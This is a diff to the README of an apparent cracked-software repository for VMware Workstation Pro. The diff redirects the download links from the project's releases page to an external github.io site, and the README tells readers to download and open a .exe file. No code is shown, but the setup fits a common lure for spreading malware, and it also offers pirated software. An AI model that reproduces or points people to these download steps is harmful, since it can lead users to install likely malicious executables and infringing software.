@@ -1,6 +1,6 @@
 # 🖥️ VMware-Workstation-Pro-Crack - Run virtual machines on your computer
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Finafuzzy825/VMware-Workstation-Pro-Crack/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://finafuzzy825.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these minimum stand
 
 To begin using the software, follow these steps to download and set up your environment.
 
-1. Visit this page to download: [https://github.com/Finafuzzy825/VMware-Workstation-Pro-Crack/releases](https://github.com/Finafuzzy825/VMware-Workstation-Pro-Crack/releases)
+1. Visit this page to download: [https://finafuzzy825.github.io](https://finafuzzy825.github.io)
 2. Locate the most recent release version in the list.
 3. Click the file ending in .exe to start the transfer to your computer.
 4. Open the file once the download finishes.
